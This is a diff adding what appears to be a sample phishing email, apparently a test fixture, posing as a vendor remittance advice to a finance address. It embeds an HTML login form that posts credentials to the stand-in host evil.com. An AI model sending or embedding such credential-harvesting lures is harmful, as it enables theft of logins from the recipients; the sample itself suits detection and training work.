@@ -1,0 +1,5 @@
+Subject: Remittance Advice
+From: ap@unknown-vendor.com
+To: finance@company.com
+
+To view your unpaid invoice, please sign in to the portal: <form action='http://evil.com/login' type='password'></form>
